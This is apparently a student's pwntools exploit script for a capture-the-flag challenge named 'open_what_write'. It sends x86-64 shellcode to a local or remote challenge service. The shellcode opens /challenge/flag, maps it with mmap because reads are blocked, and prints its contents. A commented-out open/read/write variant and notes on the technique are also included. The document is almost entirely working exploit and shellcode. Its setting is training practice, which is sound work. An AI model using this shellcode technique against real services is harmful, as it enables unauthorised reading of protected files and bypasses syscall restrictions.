from pwn import *
CHALL = "./open_what_write"
COMMANDS = """
b *0x0000000000401B83
c
"""
context.arch = "amd64"
if args.REMOTE: 
    p = remote("open-what-write.ctf.offensivedefensive.it", 8080, ssl=True)
elif args.GDB:
    p = gdb.debug(CHALL, COMMANDS)
else:
    p = process(CHALL)
    
# shellcode = asm("""                  
# xor    rsi,rsi
# add    rax,0x4c
# mov    rdi,rax
# mov    rax,0x2
# syscall
# mov rsi, 0x4CEB00
# mov rdi, rax
# mov   rdx,0x100
# mov   rax,0x0
# syscall
# mov rsi, 0x4CEB00
# mov    rdi,1
# mov    rax,0x1
# mov rdx, 0x100
# syscall  
# ret     
#                 """) + b"/challenge/flag"  

# p.send(shellcode)
# p.interactive()

# it's just like open read write in the training challenge, but this time no read syscall allowed. 
# so i just use mmap to map the file to the memory. like in the class, i write string /challenge/flag to the end of the shellcode
# calculating the offset with defuse.ca, this shellcode contains 0x5b bytes then the next one should be my string and i put them into my shellcode
# p.send so that exactly the size of my shellcode

shellcode = """
nop
mov rdi, rax
add rdi, 0x5c
xor rsi, rsi
xor rax, rax
mov rax, 0x02
syscall

mov rdi, 0
mov rsi, 0x1000
mov rdx, 0x1
mov r10, 0x2
mov r8, rax
xor r9, r9
mov rax, 9
syscall

mov rsi, rax
mov rdi, 1
mov rax, 1
mov rdx, 0x100
syscall
"""
shellcode_c = asm(shellcode)
p.send(shellcode_c+b"/challenge/flag\0")
p.interactive()
